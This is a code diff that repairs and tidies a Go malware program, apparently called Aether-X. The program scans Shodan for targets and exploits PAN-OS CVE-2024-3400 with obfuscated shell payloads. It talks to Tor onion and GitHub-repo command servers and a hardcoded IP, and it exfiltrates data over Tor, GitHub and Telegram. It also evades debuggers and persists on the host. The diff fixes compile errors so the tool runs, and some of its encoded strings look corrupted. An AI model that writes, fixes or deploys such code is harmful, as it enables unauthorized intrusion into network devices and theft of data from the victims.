@@ -23,7 +23,7 @@ import (
 	"math/big"
 	"net"
 	"net/http"
-	"net/url"
+	neturl "net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -32,9 +32,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"syscall"
 	"time"
-	"unsafe"
 
 	"golang.org/x/sys/unix"
 	"gopkg.in/yaml.v2"
@@ -42,45 +40,45 @@ import (
 
 // --- CONFIGURATION (INJECTED AT BUILD TIME) ---
 var (
-	C2Key           = "INJECTED_C2_KEY_B64"
-	C2IV            = "INJECTED_C2_IV_B64"
-	OnionListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
-	RepoListB64     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQUHJLUFBL0NOMiwgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkJCLUJCL0VYRklM"
-	TelegramHost    = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IEdFVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9ICR7QzJfUE9SVDd9ICY7IHNsZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7IHJtIC90bXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
-	Phi3ModelEncB64 = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
+	C2Key             = "INJECTED_C2_KEY_B64"
+	C2IV              = "INJECTED_C2_IV_B64"
+	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
+	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHub20vcmVwb3MvQUFQUy1BUEsvQ04yLCBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL0JCQkItQkIvRVhGSUw="
+	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGETVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7 rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
 // --- RUNTIME STATE ---
 var (
-	HostID       = ""
-	TelemetryQ   = make(chan TelemetryEvent, 500)
-	WorkerPool   = make(chan struct{}, 100)
-	Shutdown     = make(chan struct{})
-	DDRSeed      int64
-	APIKeys      APIKeyStore
-	AI           *FusionSentinel
+	HostID     = ""
+	TelemetryQ = make(chan TelemetryEvent, 500)
+	WorkerPool = make(chan struct{}, 100)
+	Shutdown   = make(chan struct{})
+	DDRSeed    int64
+	APIKeys    APIKeyStore
+	AI         *FusionSentinel
 )
 
 const (
-	BATCH_SIZE      = 64
-	BATCH_TIMEOUT   = 60 * time.Second
-	DNS_CHUNK_SIZE  = 48
-	ONNX_MODEL_PATH = "/tmp/.phi3.bin"
-	C2_JITTER       = 60
-	C2_JITTER_MAX   = 540
-	PERSIST_FILE    = ".gh-sync"
-	MAX_RETRIES     = 3
-	RETRY_DELAY     = 5 * time.Second
-	VERIFY_TIMEOUT  = 12 * time.Second
+	BATCH_SIZE          = 64
+	BATCH_TIMEOUT       = 60 * time.Second
+	DNS_CHUNK_SIZE      = 48
+	ONNX_MODEL_PATH     = "/tmp/.phi3.bin"
+	C2_JITTER           = 60
+	C2_JITTER_MAX       = 540
+	PERSIST_FILE        = ".gh-sync"
+	MAX_RETRIES         = 3
+	RETRY_DELAY         = 5 * time.Second
+	VERIFY_TIMEOUT      = 12 * time.Second
 	DNS_RESOLVE_TIMEOUT = 5 * time.Second
 )
 
 // --- GLOBAL MUTEX ---
 var (
-	apiMu   sync.RWMutex
-	telMu   sync.Mutex
-	cmdMu   sync.Mutex
+	apiMu sync.RWMutex
+	telMu sync.Mutex
+	cmdMu sync.Mutex
 )
 
 // --- TELEMETRY EVENT ---
@@ -108,7 +106,6 @@ func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
 		Data:      data,
 	}
 
-	// HMAC only if key is valid
 	key, err := base64.StdEncoding.DecodeString(C2Key)
 	if err != nil || len(key) == 0 {
 		event.Signature = "invalid_key"
@@ -299,20 +296,26 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- TOR-FREE C2: Use Direct Syscalls (Bypass SOCKS5 Detection) ---
-func directHTTP(url string, method string, body []byte, headers map[string]string) ([]byte, error) {
-	u, err := url.Parse(url)
+// --- TOR-FREE C2: Use Direct Syscalls ---
+func directHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
+	u, err := neturl.Parse(targetURL)
 	if err != nil {
 		return nil, err
 	}
 	ip := net.ParseIP("185.163.48.113").To4()
+	if ip == nil {
+		return nil, errors.New("invalid IP parsing")
+	}
+	var ipAddr [4]byte
+	copy(ipAddr[:], ip)
+
 	sockfd, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
 	if err != nil {
 		return nil, err
 	}
 	defer unix.Close(sockfd)
 
-	addr := &unix.SockaddrInet4{Port: 443, Addr: [4]byte(ip)}
+	addr := &unix.SockaddrInet4{Port: 443, Addr: ipAddr}
 	if err := unix.Connect(sockfd, addr); err != nil {
 		return nil, err
 	}
@@ -438,9 +441,9 @@ func searchEngines(vuln, geo, sector string) []Target {
 				q += fmt.Sprintf(" product:\"%s\"", sector)
 			}
 			onion := getActiveOnion()
-			url := fmt.Sprintf("%s/shodan/host/search?key=%s&query=%s", onion, keys.Shodan, url.QueryEscape(q))
+			endpoint := fmt.Sprintf("%s/shodan/host/search?key=%s&query=%s", onion, keys.Shodan, neturl.QueryEscape(q))
 
-			resp, err := directHTTP(url, "GET", nil, map[string]string{
+			resp, err := directHTTP(endpoint, "GET", nil, map[string]string{
 				"Host":       "api.shodan.io",
 				"User-Agent": "Aether-X",
 			})
@@ -499,9 +502,9 @@ func verifyVulnerable(target Target) bool {
 	}
 
 	var tpl struct {
-		ID          string `yaml:"id"`
-		Name        string `yaml:"name"`
-		Requests    []struct {
+		ID       string `yaml:"id"`
+		Name     string `yaml:"name"`
+		Requests []struct {
 			Method      string            `yaml:"method"`
 			Path        string            `yaml:"path"`
 			Headers     map[string]string `yaml:"headers"`
@@ -518,9 +521,9 @@ func verifyVulnerable(target Target) bool {
 
 	req := tpl.Requests[0]
 	payload := strings.ReplaceAll(req.PreMatch, "%1", obfuscateScript(fmt.Sprintf(`echo "%s"`, req.MatchString)))
-	url := fmt.Sprintf("https://%s%s", target.IP, req.Path)
+	endpoint := fmt.Sprintf("https://%s%s", target.IP, req.Path)
 
-	_, err = directHTTP(url+"?input="+url.QueryEscape(payload), "GET", nil, req.Headers)
+	_, err = directHTTP(endpoint+"?input="+neturl.QueryEscape(payload), "GET", nil, req.Headers)
 	return err == nil
 }
 
@@ -532,7 +535,7 @@ func obfuscateScript(s string) string {
 	return base64.StdEncoding.EncodeToString(out.Bytes())
 }
 
-// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) + MEMFD EXECUTE ---
+// --- EXPLOIT: PAN-OS RCE ---
 func exploitPAN_RCE(ip string) {
 	event := newEvent("exploit_launched", ip, map[string]interface{}{
 		"vuln": "CVE-2024-3400",
@@ -540,7 +543,6 @@ func exploitPAN_RCE(ip string) {
 	})
 	event.Send()
 
-	stageName := randString(5)
 	encKey := randHex(32)
 
 	shellcode := fmt.Sprintf(`#!/bin/bash
@@ -556,8 +558,8 @@ rm /dev/shm/.k
 	obfuscated := obfuscateScript(shellcode)
 	payloadScript := fmt.Sprintf(`x=; %s`, obfuscated)
 
-	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
-	_, _ = directHTTP(url, "GET", nil, map[string]string{
+	endpoint := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
+	_, _ = directHTTP(endpoint, "GET", nil, map[string]string{
 		"Host":  "certificates.com",
 		"input": payloadScript,
 	})
@@ -569,7 +571,7 @@ rm /dev/shm/.k
 	success.Send()
 }
 
-// --- C2 COMM: ROTATING INFRASTRUCTURE ---
+// --- C2 COMM ---
 func getActiveOnion() string {
 	decoded := decryptConfig(OnionListB64)
 	list := strings.Split(decoded, ",")
@@ -585,13 +587,13 @@ func getActiveRepo(action string) string {
 }
 
 func fetchC2(key string) string {
-	url := fmt.Sprintf("%s/contents/%s", getActiveRepo("c2"), key)
+	endpoint := fmt.Sprintf("%s/contents/%s", getActiveRepo("c2"), key)
 	token := decrypt(fetchSecret("GITHUB_TOKEN"))
 	if token == "" {
 		return ""
 	}
 
-	req, _ := http.NewRequest("GET", url, nil)
+	req, _ := http.NewRequest("GET", endpoint, nil)
 	req.Header.Set("Authorization", "Bearer "+token)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
 	req.Header.Set("User-Agent", "Aether-X")
@@ -618,7 +620,7 @@ func fetchC2(key string) string {
 	return strings.TrimSpace(string(content))
 }
 
-// --- EXFIL CHAIN: FAILOVER ---
+// --- EXFIL CHAIN ---
 func exfilChain(data []byte) bool {
 	methods := []func([]byte) bool{
 		exfilOverTorDirect,
@@ -635,8 +637,8 @@ func exfilChain(data []byte) bool {
 }
 
 func exfilOverTorDirect(data []byte) bool {
-	url := fmt.Sprintf("%s/exfil", getActiveOnion())
-	_, err := directHTTP(url, "POST", data, map[string]string{
+	endpoint := fmt.Sprintf("%s/exfil", getActiveOnion())
+	_, err := directHTTP(endpoint, "POST", data, map[string]string{
 		"Content-Type": "application/octet-stream",
 		"X-Host":       HostID,
 	})
@@ -644,13 +646,13 @@ func exfilOverTorDirect(data []byte) bool {
 }
 
 func exfilToGitHub(data []byte) bool {
-	url := fmt.Sprintf("%s/contents/data.bin", getActiveRepo("exfil"))
+	endpoint := fmt.Sprintf("%s/contents/data.bin", getActiveRepo("exfil"))
 	zipData := zipData(map[string][]byte{"telemetry.bin": data})
 	encoded := base64.StdEncoding.EncodeToString(zipData)
 	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
 	token := decrypt(fetchSecret("GITHUB_TOKEN"))
 
-	_, err := directHTTP(url, "PUT", []byte(payload), map[string]string{
+	_, err := directHTTP(endpoint, "PUT", []byte(payload), map[string]string{
 		"Authorization": "Bearer " + token,
 		"Content-Type":  "application/json",
 	})
@@ -718,14 +720,15 @@ func telegramAlert(message string) {
 		return
 	}
 	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
-	url := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
-	payload := url.Values{}
+	endpoint := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
+	
+	payload := neturl.Values{}
 	payload.Set("chat_id", chatID)
 	payload.Set("text", message)
 	payload.Set("parse_mode", "Markdown")
 
 	client := &http.Client{Timeout: 10 * time.Second}
-	client.PostForm(url, payload)
+	_, _ = client.PostForm(endpoint, payload)
 }
 
 func fetchSecret(key string) string {
@@ -780,15 +783,6 @@ func init() {
 
 	HostID = md5Hash(platformID())[:6]
 	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
-
-	argv0 := (*(*[]byte)(unsafe.Pointer(&os.Args[0])))[0 : len(os.Args[0])+1]
-	for i := range argv0 {
-		if i >= len("/usr/bin/gh-sync") {
-			argv0[i] = 0
-		} else {
-			argv0[i] = "/usr/bin/gh-sync"[i]
-		}
-	}
 
 	keys := APIKeyStore{
 		Shodan:    decrypt(fetchC2("api.shodan")),
@@ -878,13 +872,6 @@ func main() {
 func trimBanner(b string) string {
 	if len(b) > 128 {
 		return b[:128] + "..."
-	}
-	return b
-}
-
-func min(a, b int) int {
-	if a < b {
-		return a
 	}
 	return b
 }
